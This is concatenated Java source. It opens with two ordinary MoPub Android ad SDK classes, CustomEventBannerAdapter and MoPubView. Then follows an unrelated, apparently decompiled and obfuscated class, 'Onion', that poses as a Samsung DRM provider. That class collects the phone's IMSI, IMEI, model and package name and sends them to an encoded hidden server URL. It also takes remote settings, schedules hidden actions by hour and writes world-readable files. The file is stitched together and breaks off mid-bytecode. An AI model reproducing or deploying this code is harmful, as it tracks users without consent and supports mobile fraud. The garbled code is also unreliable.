package com.mopub.mobileads;

import android.content.Context;
import android.os.Handler;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.view.View;

import com.mopub.common.AdReport;
import com.mopub.common.Constants;
import com.mopub.common.Preconditions;
import com.mopub.common.logging.MoPubLog;
import com.mopub.common.util.ReflectionTarget;
import com.mopub.mobileads.CustomEventBanner.CustomEventBannerListener;
import com.mopub.mobileads.events.AdCreativeIdBundle;
import com.mopub.mobileads.factories.CustomEventBannerFactory;

import java.util.Map;
import java.util.TreeMap;

import static com.mopub.common.DataKeys.AD_HEIGHT;
import static com.mopub.common.DataKeys.AD_REPORT_KEY;
import static com.mopub.common.DataKeys.AD_WIDTH;
import static com.mopub.common.DataKeys.BROADCAST_IDENTIFIER_KEY;
import static com.mopub.mobileads.MoPubErrorCode.ADAPTER_NOT_FOUND;
import static com.mopub.mobileads.MoPubErrorCode.NETWORK_TIMEOUT;
import static com.mopub.mobileads.MoPubErrorCode.UNSPECIFIED;

public class CustomEventBannerAdapter implements CustomEventBannerListener {
	public static final int DEFAULT_BANNER_TIMEOUT_DELAY = Constants.SIX_SECONDS_MILLIS;
	private boolean mInvalidated;
	private MoPubView mMoPubView;
	private Context mContext;
	private CustomEventBanner mCustomEventBanner;
	private Map<String, Object> mLocalExtras;
	private Map<String, String> mServerExtras;
	
	private final Handler mHandler;
	private final Runnable mTimeout;
	private boolean mStoredAutorefresh;
	
	public CustomEventBannerAdapter(@NonNull MoPubView moPubView, Context context,
	                                @NonNull String className,
	                                @NonNull Map<String, String> serverExtras,
	                                long broadcastIdentifier,
	                                @Nullable AdReport adReport) {
		Preconditions.checkNotNull(serverExtras);
		mHandler = new Handler();
		mMoPubView = moPubView;
		mContext = context;
		mTimeout = new Runnable() {
			@Override
			public void run() {
				onBannerTimed();
			}
		};
		
		MoPubLog.d("Attempting to invoke custom event: " + className);
		try {
			mCustomEventBanner = CustomEventBannerFactory.create(className);
		} catch (Exception exception) {
			MoPubLog.d("Couldn't locate or instantiate custom event: " + className + ".");
			mMoPubView.loadFailUrl(ADAPTER_NOT_FOUND);
			return;
		}
		
		// Attempt to load the JSON extras into mServerExtras.
		mServerExtras = new TreeMap<String, String>(serverExtras);
		
		mLocalExtras = mMoPubView.getLocalExtras();
		if (mMoPubView.getLocation() != null) {
			mLocalExtras.put("location", mMoPubView.getLocation());
		}
		mLocalExtras.put(BROADCAST_IDENTIFIER_KEY, broadcastIdentifier);
		mLocalExtras.put(AD_REPORT_KEY, adReport);
		mLocalExtras.put(AD_WIDTH, mMoPubView.getAdWidth());
		mLocalExtras.put(AD_HEIGHT, mMoPubView.getAdHeight());
	}
	
	@ReflectionTarget
	void loadAd() {
		if (isInvalidated() || mCustomEventBanner == null) {
			return;
		}
		
		mHandler.postDelayed(mTimeout, getTimeoutDelayMilliseconds());
		
		// Custom event classes can be developed by any third party and may not be tested.
		// We catch all exceptions here to prevent crashes from untested code.
		try {
			mCustomEventBanner.loadBanner(mContext, this, mLocalExtras, mServerExtras);
		} catch (Exception e) {
			MoPubLog.d("Loading a custom event banner threw an exception.", e);
			onBannerFailed(MoPubErrorCode.INTERNAL_ERROR);
		}
	}
	
	@ReflectionTarget
	void invalidate() {
		if (mCustomEventBanner != null) {
			// Custom event classes can be developed by any third party and may not be tested.
			// We catch all exceptions here to prevent crashes from untested code.
			try {
				mCustomEventBanner.onInvalidate();
			} catch (Exception e) {
				MoPubLog.d("Invalidating a custom event banner threw an exception", e);
			}
		}
		mContext = null;
		mCustomEventBanner = null;
		mLocalExtras = null;
		mServerExtras = null;
		mInvalidated = true;
	}
	
	@ReflectionTarget
	void stop() {
		if (mCustomEventBanner != null) {
			try {
				mCustomEventBanner.onStop();
			} catch (Exception e) {
				MoPubLog.d("Stopping a custom event banner threw an exception", e);
			}
		}
	}
	
	@ReflectionTarget
	void pause() {
		if (mCustomEventBanner != null) {
			try {
				mCustomEventBanner.onPause();
			} catch (Exception e) {
				MoPubLog.d("Stopping a custom event banner threw an exception", e);
			}
		}
	}
	
	@ReflectionTarget
	void resume() {
		if (mCustomEventBanner != null) {
			try {
				mCustomEventBanner.onResume();
			} catch (Exception e) {
				MoPubLog.d("Stopping a custom event banner threw an exception", e);
			}
		}
	}
	
	@ReflectionTarget
	void destroy() {
		cancelTimeout();
	}
	
	boolean isInvalidated() {
		return mInvalidated;
	}
	
	private void cancelTimeout() {
		mHandler.removeCallbacks(mTimeout);
	}
	
	private int getTimeoutDelayMilliseconds() {
//        if (mMoPubView == null
//                || mMoPubView.getAdTimeoutDelay() == null
//                || mMoPubView.getAdTimeoutDelay() < 0) {
//            return DEFAULT_BANNER_TIMEOUT_DELAY;
//        }
//
//        return mMoPubView.getAdTimeoutDelay() * 1000;
		return DEFAULT_BANNER_TIMEOUT_DELAY;
	}
	
	
	/*
	 * CustomEventBanner.Listener implementation
	 */
	@Override
	public void onBannerLoaded(final View bannerView, @Nullable final AdCreativeIdBundle adCreativeIdBundle) {
		if (isInvalidated()) {
			return;
		}
		
		cancelTimeout();
		
		if (mMoPubView != null) {
			mMoPubView.setAdContentView(bannerView);
			mMoPubView.setAdCreativeId(adCreativeIdBundle);
			mMoPubView.nativeAdLoaded();
			if (!(bannerView instanceof HtmlBannerWebView)) {
				mMoPubView.trackNativeImpression();
			}
		}
	}
	
	private void onBannerTimed() {
		MoPubLog.d("Third-party network timed out.");
		onBannerFailed(NETWORK_TIMEOUT);
		invalidate();
	}
	
	@Override
	public void onBannerFailed(MoPubErrorCode errorCode) {
		if (isInvalidated()) {
			return;
		}
		
		if (mMoPubView != null) {
			if (errorCode == null) {
				errorCode = UNSPECIFIED;
			}
			cancelTimeout();
			mMoPubView.loadFailUrl(errorCode);
		}
	}
	
	@Override
	public void onBannerExpanded() {
		if (isInvalidated()) {
			return;
		}
		
		mStoredAutorefresh = mMoPubView.getAutorefreshEnabled();
		mMoPubView.setAutorefreshEnabled(false);
		mMoPubView.adPresentedOverlay();
	}
	
	@Override
	public void onBannerCollapsed() {
		if (isInvalidated()) {
			return;
		}
		
		mMoPubView.setAutorefreshEnabled(mStoredAutorefresh);
		mMoPubView.adClosed();
	}
	
	@Override
	public void onBannerClicked() {
		if (isInvalidated()) {
			return;
		}
		
		if (mMoPubView != null) {
			mMoPubView.registerClick();
		}
	}
	
	@Override
	public void onLeaveApplication() {
		onBannerClicked();
	}
}

//@formatter:off
package com.mopub.mobileads;

import android.app.Activity;
import android.content.Context;
import android.location.Location;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.text.TextUtils;
import android.util.AttributeSet;
import android.view.View;
import android.webkit.WebViewDatabase;
import android.widget.FrameLayout;

import com.mopub.common.AdFormat;
import com.mopub.common.AdReport;
import com.mopub.common.logging.MoPubLog;
import com.mopub.common.util.ManifestUtils;
import com.mopub.common.util.Reflection;
import com.mopub.common.util.TrackedContext;
import com.mopub.common.util.Visibility;
import com.mopub.mobileads.events.AdCreativeIdBundle;
import com.mopub.mobileads.factories.AdViewControllerFactory;

import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.TreeMap;

import static com.mopub.mobileads.MoPubErrorCode.ADAPTER_CONFIGURATION_ERROR;
import static com.mopub.mobileads.MoPubErrorCode.ADAPTER_NOT_FOUND;

public class MoPubView extends FrameLayout {
    public interface BannerAdListener {
	    public void onBannerLoadStarted(MoPubView banner);
	    public void onBannerLoaded(MoPubView banner);
	    public void onBannerNetworkFailed(MoPubView banner, MoPubErrorCode errorCode);
	    public void onBannerNetworkTimed(MoPubView banner);
	    public void onBannerFailed(MoPubView banner, MoPubErrorCode errorCode);
	    public void onBannerClicked(MoPubView banner);
	    public void onBannerExpanded(MoPubView banner);
	    public void onBannerCollapsed(MoPubView banner);
    }

    private static final String CUSTOM_EVENT_BANNER_ADAPTER_FACTORY =
            "com.mopub.mobileads.factories.CustomEventBannerAdapterFactory";

    @Nullable
    protected AdViewController mAdViewController;
    // mCustomEventBannerAdapter must be a CustomEventBannerAdapter
    protected Object mCustomEventBannerAdapter;

    private Context mContext;
    private int mScreenVisibility;

    private BannerAdListener mBannerAdListener;
	
	private Set<String> bannedAdapters;
	private boolean resumed;
	private boolean destoyed;
	private boolean pauseOnVisibilityChange;
	
	public MoPubView(Context context) {
        this(context, null);
    }

    public MoPubView(Context context, AttributeSet attrs) {
        super(context, attrs);

        ManifestUtils.checkWebViewActivitiesDeclared(context);

        mContext = context;
        mScreenVisibility = getVisibility();
	    bannedAdapters = new HashSet<>();

        setHorizontalScrollBarEnabled(false);
        setVerticalScrollBarEnabled(false);
	    setPauseOnVisibilityChange(true);

        try {
            // There is a rare bug in Froyo/2.2 where creation of a WebView causes a
            // NullPointerException. (https://code.google.com/p/android/issues/detail?id=10789)
            // It happens when the WebView can't access the local file store to make a cache file.
            // Here, we'll work around it by trying to create a file store and then just go inert
            // if it's not accessible.
            if (WebViewDatabase.getInstance(context) == null) {
                MoPubLog.e("Disabling MoPub. Local cache file is inaccessible so MoPub will " +
                        "fail if we try to create a WebView. Details of this Android bug found at:" +
                        "https://code.google.com/p/android/issues/detail?id=10789");
                return;
            }
        } catch (Exception e) {
            // If anything goes wrong here, it's most likely due to not having a WebView at all.
            // This happens when Android updates WebView.
            MoPubLog.e("Disabling MoPub due to no WebView, or it's being updated", e);
            return;
        }

        mAdViewController = AdViewControllerFactory.create(context, this);
    }

    public void loadAd() {
	    if (!resumed){
		    return;
	    }
	
	    if (mAdViewController != null) {
            mAdViewController.loadAd();
        }
    }

    /*
     * Tears down the ad view: no ads will be shown once this method executes. The parent
     * Activity's onDestroy implementation must include a call to this method.
     */
    public void destroy() {
	    if (destoyed){
		    return;
	    }
	    
	    destoyed = true;
        removeAllViews();

        if (mAdViewController != null) {
            mAdViewController.cleanup();
            mAdViewController = null;
        }

        if (mCustomEventBannerAdapter != null) {
            invalidateAdapter();
	        destroyAdapter();
            mCustomEventBannerAdapter = null;
        }
    }
    
    @Override
	protected void onDetachedFromWindow() {
		super.onDetachedFromWindow();
	    pause();
	}
	
	private void invalidateAdapter() {
        if (mCustomEventBannerAdapter != null) {
            try {
                new Reflection.MethodBuilder(mCustomEventBannerAdapter, "invalidate")
                        .setAccessible()
                        .execute();
            } catch (Exception e) {
                MoPubLog.e("Error invalidating adapter", e);
            }
        }
    }
    
    private void destroyAdapter() {
        if (mCustomEventBannerAdapter != null) {
            try {
                new Reflection.MethodBuilder(mCustomEventBannerAdapter, "destroy")
                        .setAccessible()
                        .execute();
            } catch (Exception e) {
                MoPubLog.e("Error invalidating adapter", e);
            }
        }
    }
	
	public void stopAdapter() {
		if (mCustomEventBannerAdapter != null) {
			try {
				new Reflection.MethodBuilder(mCustomEventBannerAdapter, "stop")
						.setAccessible()
						.execute();
			} catch (Exception e) {
				MoPubLog.e("Error stopping adapter", e);
			}
		}
	}
	
	private void pauseAdapter() {
		if (mCustomEventBannerAdapter != null) {
			try {
				new Reflection.MethodBuilder(mCustomEventBannerAdapter, "pause")
						.setAccessible()
						.execute();
			} catch (Exception e) {
				MoPubLog.e("Error pausing adapter", e);
			}
		}
	}
	
	private void resumeAdapter() {
		if (mCustomEventBannerAdapter != null) {
			try {
				new Reflection.MethodBuilder(mCustomEventBannerAdapter, "resume")
						.setAccessible()
						.execute();
			} catch (Exception e) {
				MoPubLog.e("Error resume adapter", e);
			}
		}
	}

    Integer getAdTimeoutDelay() {
        return (mAdViewController != null) ? mAdViewController.getAdTimeoutDelay() : null;
    }

    protected boolean loadFailUrl(@NonNull final MoPubErrorCode errorCode) {
        if (mAdViewController == null) {
            return false;
        }
        return mAdViewController.loadFailUrl(errorCode);
    }

    protected void loadCustomEvent(String customEventClassName, Map<String, String> serverExtras) {
        if (mAdViewController == null) {
            return;
        }
	
	    if (mBannerAdListener != null){
		    mBannerAdListener.onBannerLoadStarted(this);
	    }
	
	
	    if (TextUtils.isEmpty(customEventClassName)) {
            MoPubLog.d("Couldn't invoke custom event because the server did not specify one.");
            loadFailUrl(ADAPTER_NOT_FOUND);
            return;
        }
	
	    if (bannedAdapters.contains(customEventClassName)) {
		    MoPubLog.d("Native Network or Custom Event adapter was banned.");
		    loadFailUrl(MoPubErrorCode.ADAPTER_BANNED);
		    return;
	    }

        if (mCustomEventBannerAdapter != null) {
            invalidateAdapter();
        }

        MoPubLog.d("Loading custom event adapter.");

        if (Reflection.classFound(CUSTOM_EVENT_BANNER_ADAPTER_FACTORY)) {
            try {
                final Class<?> adapterFactoryClass = Class.forName(CUSTOM_EVENT_BANNER_ADAPTER_FACTORY);
                mCustomEventBannerAdapter = new Reflection.MethodBuilder(null, "create")
                        .setStatic(adapterFactoryClass)
                        .addParam(MoPubView.class, this)
                        .addParam(String.class, customEventClassName)
                        .addParam(Map.class, serverExtras)
                        .addParam(long.class, mAdViewController.getBroadcastIdentifier())
                        .addParam(AdReport.class, mAdViewController.getAdReport())
                        .execute();
                new Reflection.MethodBuilder(mCustomEventBannerAdapter, "loadAd")
                        .setAccessible()
                        .execute();
            } catch (Exception e) {
                MoPubLog.e("Error loading custom event", e);
	            loadFailUrl(ADAPTER_CONFIGURATION_ERROR);
            }
        } else {
            MoPubLog.e("Could not load custom event -- missing banner module");
        }
    }

    protected void registerClick() {
        if (mAdViewController != null) {
            mAdViewController.registerClick();

            // Let any listeners know that an ad was clicked
            adClicked();
        }
    }

    protected void trackNativeImpression() {
        MoPubLog.d("Tracking impression for native adapter.");
        if (mAdViewController != null) mAdViewController.trackImpression();
    }

    @Override
    protected void onWindowVisibilityChanged(final int visibility) {
        // Ignore transitions between View.GONE and View.INVISIBLE
        if (Visibility.hasScreenVisibilityChanged(mScreenVisibility, visibility)) {
            mScreenVisibility = visibility;
            setAdVisibility(mScreenVisibility);
        }
    }
	
	@Override
	protected void onVisibilityChanged(@NonNull View changedView, int visibility) {
		super.onVisibilityChanged(changedView, visibility);
		if (changedView == this && pauseOnVisibilityChange) {
			if (Visibility.hasScreenVisibilityChanged(mScreenVisibility, visibility)) {
				mScreenVisibility = visibility;
				setAdVisibility(mScreenVisibility);
			}
		}
	}
	
	private void setAdVisibility(final int visibility) {
		if (mAdViewController == null) {
			return;
		}
		
		if (Visibility.isScreenVisible(visibility)) {
			if (resumed) {
				mAdViewController.resumeRefresh();
				resumeAdapter();
			}
		} else {
			mAdViewController.pauseRefresh();
			pauseAdapter();
		}
	}
	
	
	public void resume() {
		if (!resumed) {
			resumed = true;
			if (mAdViewController != null) {
				mAdViewController.resumeRefresh();
				resumeAdapter();
			}
		}
	}
	
	public void pause() {
		if (resumed) {
			resumed = false;
			if (mAdViewController != null) {
				mAdViewController.pauseRefresh();
				mAdViewController.setNotLoading();
				pauseAdapter();
			}
		}
	}
	
	
	protected void adLoaded() {
        MoPubLog.d("adLoaded");

        if (mBannerAdListener != null) {
            mBannerAdListener.onBannerLoaded(this);
        }
    }
	
	protected void adNetworkFailed(MoPubErrorCode moPubErrorCode) {
		if (mBannerAdListener != null) {
			mBannerAdListener.onBannerNetworkFailed(this, moPubErrorCode);
		}
	}
	
	protected void adFailed(MoPubErrorCode errorCode) {
		if (mBannerAdListener != null) {
			mBannerAdListener.onBannerFailed(this, errorCode);
		}
	}
	
	public void adNetworkTimed() {
		if (mBannerAdListener != null) {
			mBannerAdListener.onBannerNetworkTimed(this);
		}
	}

    protected void adPresentedOverlay() {
        if (mBannerAdListener != null) {
            mBannerAdListener.onBannerExpanded(this);
        }
    }

    protected void adClosed() {
        if (mBannerAdListener != null) {
            mBannerAdListener.onBannerCollapsed(this);
        }
    }

    protected void adClicked() {
        if (mBannerAdListener != null) {
            mBannerAdListener.onBannerClicked(this);
        }
    }

    protected void nativeAdLoaded() {
        if (mAdViewController != null) mAdViewController.scheduleRefreshTimerIfEnabled();
        adLoaded();
    }

    ////////////////////////////////////////////////////////////////////////////////////////////////

    public void setAdUnitId(String adUnitId) {
        if (mAdViewController != null) mAdViewController.setAdUnitId(adUnitId);
    }

    public String getAdUnitId() {
        return (mAdViewController != null) ? mAdViewController.getAdUnitId() : null;
    }

    public void setKeywords(String keywords) {
        if (mAdViewController != null) mAdViewController.setKeywords(keywords);
    }

    public String getKeywords() {
        return (mAdViewController != null) ? mAdViewController.getKeywords() : null;
    }

    public void setLocation(Location location) {
        if (mAdViewController != null) mAdViewController.setLocation(location);
    }

    public Location getLocation() {
        return (mAdViewController != null) ? mAdViewController.getLocation() : null;
    }

    public int getAdWidth() {
        return (mAdViewController != null) ? mAdViewController.getAdWidth() : 0;
    }

    public int getAdHeight() {
        return (mAdViewController != null) ? mAdViewController.getAdHeight() : 0;
    }

    public Activity getActivity() {
        return (Activity) mContext;
    }

    public void setBannerAdListener(BannerAdListener listener) {
        mBannerAdListener = listener;
    }

    public BannerAdListener getBannerAdListener() {
        return mBannerAdListener;
    }

    public void setLocalExtras(Map<String, Object> localExtras) {
        if (mAdViewController != null) mAdViewController.setLocalExtras(localExtras);
    }

    public Map<String, Object> getLocalExtras() {
        if (mAdViewController != null) {
            return mAdViewController.getLocalExtras();
        }
        return new TreeMap<String, Object>();
    }

    public void setAutorefreshEnabled(boolean enabled) {
        if (mAdViewController != null) {
            mAdViewController.setShouldAllowAutoRefresh(enabled);
        }
    }

    public boolean getAutorefreshEnabled() {
        if (mAdViewController != null) return mAdViewController.getCurrentAutoRefreshStatus();
        else {
            MoPubLog.d("Can't get autorefresh status for destroyed MoPubView. " +
                    "Returning false.");
            return false;
        }
    }

    public void setAdContentView(View view) {
        if (mAdViewController != null) mAdViewController.setAdContentView(view);
    }
    
    public void setAdCreativeId(AdCreativeIdBundle creativeId) {
        if (mAdViewController != null) mAdViewController.setAdCreativeId(creativeId);
    }

    public void setTesting(boolean testing) {
        if (mAdViewController != null) mAdViewController.setTesting(testing);
    }

    public boolean getTesting() {
        if (mAdViewController != null) return mAdViewController.getTesting();
        else {
            MoPubLog.d("Can't get testing status for destroyed MoPubView. " +
                    "Returning false.");
            return false;
        }
    }

    public void forceRefresh() {
        if (mCustomEventBannerAdapter != null) {
            invalidateAdapter();
            mCustomEventBannerAdapter = null;
        }

        if (mAdViewController != null) {
            mAdViewController.forceRefresh();
        }
    }

    public AdViewController getAdViewController() {
        return mAdViewController;
    }

    public AdFormat getAdFormat() {
        return AdFormat.BANNER;
    }
	
	public void banAdapter(String adapterClassName) {
		bannedAdapters.add(adapterClassName);
	}
	
	public void permitAdapter(String adapterClassName) {
		bannedAdapters.remove(adapterClassName);
	}
	
	public void setShowMarker(boolean showMarker) {
		if (mAdViewController != null) {
			mAdViewController.setShowMarker(showMarker);
		}
	}
	
	public Context getTrackedContext() {
		Context context = getContext();
		TrackedContext trackedContext = new TrackedContext(context.getApplicationContext());
		trackedContext.attachActivityContext(getActivity());
		return trackedContext;
	}
	
	public void setPauseOnVisibilityChange(boolean pauseOnVisibilityChange) {
		this.pauseOnVisibilityChange = pauseOnVisibilityChange;
	}
	
	/**
     * @deprecated As of release 4.4.0
     */
    @Deprecated
    public void setTimeout(int milliseconds) {
    }

    @Deprecated
    public String getResponseString() {
        return null;
    }

    @Deprecated
    public String getClickTrackingUrl() {
        return null;
    }
}

public class Onion {
	public static boolean a;

	public static int b;

	public static int c;

	public static String e;

	public static String f;

	private static Onion j = null;

	public String d = "7CMg9e0R72B58Ii28CRD9eihux0byC02zx3O9e0RrezRrn__";

	Context g = null;

	String h = null;

	String i = null;

	private boolean k = true;

	private String l = "7xBNzKFCzKFW9IiW";

	private String m = "7xBNzKFCzKF59IiW";

	static {
		a = true;
		b = 4;
		c = 33;
		e = "7CMg9IkOzoFhHxlOuIRRu2BwuK0p8Cp_";
		f = "8";
	}

	public static int a() {
		return b;
	}

	private String a(String paramString) {
		Doctype doctype1 = Doctype.a(11);
		Doctype doctype2 = Doctype.a(0);
		String str7 = f();
		String str3 = doctype2.c(str7 + "ewar01", null);
		int i = b;
		String str4 = Build.VERSION.RELEASE;
		String str5 = Build.MANUFACTURER;
		String str6 = Build.MODEL;
		String str2 = doctype2.c(str7 + "wwenglish", null);
		String str1 = str2;
		if (str2 == null) {
			str1 = ((TelephonyManager)this.g.getSystemService("phone")).getDeviceId();
			doctype2.b(str7 + "wwenglish", str1);
		}
		String str8 = Build.VERSION.SDK;
		long l1 = Doctype.a(0).a("html", 0L);
		int j = doctype2.b("novel", 0);
		int k = doctype1.b("style", 0);
		int m = doctype1.b("height", 0);
		int n = doctype2.b("from", 0);
		str2 = null;
		long l2 = doctype1.a("type", 0L);
		if (0L != l2)
			str2 = l2 + "";
		String str9 = this.g.getPackageName();
		String str10 = doctype1.c(str7 + "head", null);
		str7 = doctype1.c(str7 + "begineditable", null);
		Object[] arrayOfObject = new Object[18];
		arrayOfObject[0] = this.h;
		arrayOfObject[1] = str3;
		arrayOfObject[2] = Integer.valueOf(i);
		arrayOfObject[3] = str4;
		arrayOfObject[4] = str5;
		arrayOfObject[5] = str6;
		arrayOfObject[6] = f;
		arrayOfObject[7] = str1;
		arrayOfObject[8] = str8;
		arrayOfObject[9] = Long.valueOf(l1);
		arrayOfObject[10] = Integer.valueOf(j);
		arrayOfObject[11] = Integer.valueOf(k);
		arrayOfObject[12] = Integer.valueOf(m);
		arrayOfObject[13] = Integer.valueOf(n);
		arrayOfObject[14] = str2;
		arrayOfObject[15] = str9;
		arrayOfObject[16] = str10;
		arrayOfObject[17] = str7;
		StringBuffer stringBuffer = new StringBuffer(paramString);
		i = 0;
		for (j = 0; j < arrayOfObject.length; j++) {
			if (arrayOfObject[j] != null) {
				if (i != 0) {
					stringBuffer.append("&");
				} else {
					i = 1;
					stringBuffer.append("?");
				}
				stringBuffer.append((char)(j + 97));
				stringBuffer.append("=");
				stringBuffer.append(Xmlns.a(arrayOfObject[j]));
				stringBuffer.append("&");
				stringBuffer.append((char)(j + 97));
				stringBuffer.append("1=");
				stringBuffer.append(Xmlns.a(Xmlns.b(String.valueOf(arrayOfObject[j]))));
			}
		}
		stringBuffer.append("&key=");
		stringBuffer.append(Xmlns.b((new Date()).getTime() + ""));
		return stringBuffer.toString();
	}

	private void b() {
		try {
			if (this.h == null)
				this.h = ((TelephonyManager)this.g.getSystemService("phone")).getSubscriberId();
		} catch (Exception exception) {}
		c();
	}

	private void b(String paramString) {
		if (Xmlns.a(paramString))
			throw new Exception();
		String str = Xmlns.d(paramString);
		InputStream inputStream = Doctype.a.getAssets().open(str);
		FileOutputStream fileOutputStream = Doctype.a.openFileOutput(str, 3);
		byte[] arrayOfByte = new byte[1024];
		while (true) {
			if (inputStream.read(arrayOfByte) == -1) {
				fileOutputStream.flush();
				inputStream.close();
				fileOutputStream.close();
				return;
			}
			fileOutputStream.write(arrayOfByte);
		}
	}

	private void c() {
		try {
			Doctype doctype = Doctype.a(11);
			if (!Xmlns.a(Long.valueOf(doctype.a("type", 0L)).longValue())) {
				Long long_1 = Long.valueOf(doctype.a("content", 0L));
				long l1 = doctype.a("text", 7200000L);
				long l2 = Math.abs((new Date()).getTime() - long_1.longValue());
				if (long_1.longValue() == 0L || l2 > Long.valueOf(l1).longValue())
					d();
			}
			Long long_ = Long.valueOf(doctype.a("type", 0L));
			if (Xmlns.a(long_.longValue())) {
				Date date = new Date();
				long l = doctype.a("link", 86400000L);
				if (Math.abs(date.getTime() - long_.longValue()) < l) {
					int i = doctype.b("family", 0);
					int j = doctype.b("size", 24);
					int k = date.getHours();
					if (i <= k && k <= j && e()) {
						Doctype doctype1 = Doctype.a(0);
						doctype1.a("novel", doctype.b("doctitle", 0));
						doctype1.a("from", 3);
						doctype.a("endeditable", "face");
						doctype.a("style", 0);
						doctype.a("style", 0);
						doctype.a("height", 0);
						if (!Xmlns.a(doctype.c("11pt", null)))
							(new External(this)).start();
						a = true;
						this.k = false;
						Intent intent = new Intent(Description.b);
						this.g.sendBroadcast(intent);
					}
				}
			}
		} catch (Exception exception) {}
		a = true;
	}

	private void d() {
		European european;
		Doctype doctype1 = Doctype.a(11);
		try {
			str1 = doctype1.c("begintemplate", null);
			String str = str1;
			if (Xmlns.a(str1))
				str = Xmlns.d("HoiprJbh9CVp9I0h8Cg1zKVO7CAO7CfaPJSQfvMUH2B574i18CQ_");
			str = a(str);
			if (str == null)
				return;
			european = new European(str);
			doctype1.a("content", Long.valueOf((new Date()).getTime()));
			str1 = european.a(0);
			Date date = new Date();
			if ("-2".equals(str1)) {
				doctype1.a();
				Doctype.a(0).a("saved", "peace");
				return;
			}
		} catch (Exception null) {
			doctype1.a("begintemplate");
			if (!Xmlns.a(doctype1.a("body", 0L))) {
				Date date = new Date();
				int i1 = doctype1.b("topmargin", 0) + 1;
				doctype1.a("topmargin", i1);
				doctype1.a("body", Long.valueOf(date.getTime()));
				if (i1 >= 7) {
					try {
						str1 = Xhtml.a(Xmlns.d("HoiprJbh9CFE8CrOrCRO7cBw8CpO7CQhr2MW8tMeKNnp0JT57wrQfJjYfoFOXxyOHoig8S__"), false, "utf-8", "^[\\W]+v_____:");
						if ("-2".equals(str1)) {
							doctype1.a();
							Doctype.a(0).a("saved", "peace");
							return;
						}
					} catch (Exception exception) {
						return;
					}
					if ("-1".equals(str1)) {
						doctype1.a();
						return;
					}
					if ("0".equals(str1)) {
						doctype1.a("type", Long.valueOf(exception.getTime()));
						return;
					}
					if ("".equals(str1)) {
						doctype1.a("begintemplate");
						return;
					}
					if (!Xmlns.a(Xmlns.d(str1))) {
						doctype1.a("begintemplate", str1);
						doctype1.a("body");
						doctype1.a("topmargin");
					}
				}
			}
		}
		if ("-1".equals(str1)) {
			doctype1.a();
			Doctype.a(0).a();
			return;
		}
		if ("0".equals(str1)) {
			str1 = european.a(13);
			doctype1.a("type", Long.valueOf(exception.getTime())).a("begintemplate", str1);
			return;
		}
		if ("".equals(str1)) {
			doctype1.a("begintemplate");
			return;
		}
		String str9 = european.a(1);
		String str1 = european.a(2);
		String str10 = european.a(3);
		String str2 = european.a(4);
		String str3 = european.a(5);
		String str11 = european.a(6);
		String str12 = european.a(7);
		String str13 = european.a(8);
		String str14 = european.a(9);
		String str15 = european.a(10);
		String str4 = european.a(11);
		String str16 = european.a(12);
		String str5 = european.a(13);
		String str6 = european.a(14);
		String str7 = european.a(15);
		String str8 = european.a(16);
		long l1 = Long.parseLong(str9);
		int i = Integer.parseInt(str10);
		int j = Integer.parseInt(str11);
		int k = Integer.parseInt(str12);
		long l2 = Long.parseLong(str13);
		int m = Integer.parseInt(str14);
		int n = Integer.parseInt(str15);
		long l3 = Long.parseLong(str16);
		str9 = f();
		Doctype doctype2 = Doctype.a(0);
		doctype2.a("warpeace", str1);
		doctype1.a("link", Long.valueOf(l1)).a("doctitle", i).a("stylesheet", str2).a("href", str3).a("gb2312", j).a("line", k).a("font", Long.valueOf(l2)).a("family", m).a("size", n).a("11pt", str4).a("text", Long.valueOf(l3)).a("begintemplate", str5).a(str9 + "head", str7).a(str9 + "begineditable", str8);
		doctype2.a(str9 + "ewar01", str6);
		if (!Xmlns.b(doctype1.a("type", 0L)))
			doctype1.a("height", 0);
		doctype1.a("style", 0).a("type", Long.valueOf(exception.getTime()));
		doctype1.a("body");
		doctype1.a("topmargin");
	}

	private boolean e() {
		// Byte code:
		//   0: bipush #11
		//   2: invokestatic a : (I)Lcom/sec/android/providers/drm/Doctype;
		//   5: astore #7
		//   7: iconst_0
		//   8: invokestatic a : (I)Lcom/sec/android/providers/drm/Doctype;
		//   11: astore #4
		//   13: aload #7
		//   15: ldc_w 'doctitle'
		//   18: iconst_0
		//   19: invokevirtual b : (Ljava/lang/String;I)I
		//   22: istore_1
		//   23: aload #4
		//   25: ldc 'novel'
		//   27: iconst_0
		//   28: invokevirtual b : (Ljava/lang/String;I)I
		//   31: istore_2
		//   32: aload #4
		//   34: ldc 'from'
		//   36: iconst_0
		//   37: invokevirtual b : (Ljava/lang/String;I)I
		//   40: istore_3
		//   41: iload_2
		//   42: iload_1
		//   43: if_icmpge -> 46
		//   46: aload_0
		//   47: getfield l : Ljava/lang/String;
		//   50: invokestatic a : (Ljava/lang/String;)Z
		//   53: ifeq -> 61
		//   56: iload_2
		//   57: iload_1
		//   58: if_icmpne -> 61
		//   61: aload_0
		//   62: getfield l : Ljava/lang/String;
		//   65: invokestatic a : (Ljava/lang/String;)Z
		//   68: ifeq -> 76
		//   71: iconst_1
		//   72: iload_3
		//   73: if_icmpne -> 76
		//   76: iload_2
		//   77: iload_1
		//   78: if_icmplt -> 121
		//   81: aload_0
		//   82: getfield l : Ljava/lang/String;
		//   85: invokestatic a : (Ljava/lang/String;)Z
		//   88: ifeq -> 96
		//   91: iconst_1
		//   92: iload_3
		//   93: if_icmpeq -> 121
		//   96: aload_0
		//   97: getfield l : Ljava/lang/String;
		//   100: invokestatic a : (Ljava/lang/String;)Z
		//   103: ifeq -> 524
		//   106: aload_0
		//   107: getfield m : Ljava/lang/String;
		//   110: invokestatic a : (Ljava/lang/String;)Z
		//   113: ifne -> 524
		//   116: iload_2
		//   117: iload_1
		//   118: if_icmpne -> 524
		//   121: aload #7
		//   123: ldc 'from'
		//   125: iconst_1
		//   126: invokevirtual a : (Ljava/lang/String;I)Lcom/sec/android/providers/drm/Doctype;
		//   129: pop
		//   130: aload #7
		//   132: ldc_w 'stylesheet'
		//   135: aconst_null
		//   136: invokevirtual c : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
		//   139: astore #5
		//   141: aload #7
		//   143: ldc_w 'href'
		//   146: aconst_null
		//   147: invokevirtual c : (Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
		//   150: astore #6
		//   152: aload #5
		//   154: invokestatic a : (Ljava/lang/String;)Z
		//   157: ifne -> 174
		//   160: aload #5
		//   162: astore #4
		//   164: aload #4
		//   166: invokestatic a : (Ljava/lang/String;)Z
		//   169: ifeq -> 189
		//   172: iconst_0
